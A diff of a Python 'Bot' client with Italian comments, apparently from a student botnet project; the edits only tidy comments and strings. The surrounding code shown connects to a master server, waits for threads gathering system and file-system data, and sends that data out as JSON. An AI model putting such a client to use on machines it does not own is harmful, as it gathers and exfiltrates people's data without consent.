@@ -46,44 +46,44 @@ class Bot:
         while self.clientSocket.connect_ex((MASTER_ADDRESS, PORT)) != 0:
             sleep(2)
 
-         # Ottenuta l'accettazione della richiesta, la comunicazione non avviene finchè thread_data non termina la raccolta dati.
+        # Ottenuta l'accettazione della richiesta, la comunicazione non avviene finchè thread_data non termina la raccolta dati.
         while self.thread_data.is_alive():
             sleep(2)
 
         # 1. Il client comunica la dimensione dei dati al server (il valore da associare come header).
         self.sendHeaderDim()
 
-        # 2. Aspetta che il server dia risposta con 'ok' della corretta ricezione.
+        # 2. Aspetta che il server dia risposta della corretta ricezione.
         first_response = ''
         while first_response != SUCCESSFUL_RESPONSE:
-            first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio 'ok'
+            first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio.
 
-        # 3. Possiamo ora inviare i dati raccolti in formato .json
+        # 3. Possiamo ora inviare i dati raccolti in formato .json.
         self.sendToServer()
 
-        # 4. Il Bot attende la fine del trhead file system prima di mandare l'header
+        # 4. Il Bot attende la fine del thread file system prima di mandare l'header.
         while self.thread_fileSystem.is_alive():
             sleep(2)
 
         # 5.  Il client comunica la dimensione dei dati al server (il valore da associare come header).
         self.sendHeaderDim()
 
-        # 6. Aspetta che il server dia risposta con 'ok' della corretta ricezione.
+        # 6. Aspetta che il server dia risposta della corretta ricezione.
         first_response = ''
         while first_response != SUCCESSFUL_RESPONSE:
-            first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio 'ok'
+            first_response = self.clientSocket.recv(1024).decode(FORMAT) # 1024 byte sono più che abbastanza per il messaggio.
 
-        # 7. Possiamo ora inviare i dati raccolti in formato .json
+        # 7. Possiamo ora inviare i dati raccolti in formato .json.
         self.sendToServer()
 
         self.clientSocket.close()
 
-        print("thread_connection terminated")
+        print("thread_connection terminated.")
 
 
     def dataScavange(self):
         """
-        Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale.
+        Procedura tramite la quale il client raccoglie i dati in formato .json e calcola la dimensione totale del pacchetto da inviare.
         :return: None
         """
         inputDict = self.informationScavanger.systemRetrieval()
@@ -112,7 +112,7 @@ class Bot:
 
     def sendToServer(self):
         """
-        Il client invia al server i dati raccolti in formato .json
+        Il client invia al server i dati raccolti in formato .json.
         :return: None
         """
         print("Data dimension in bytes (header): ", self.header_dim)
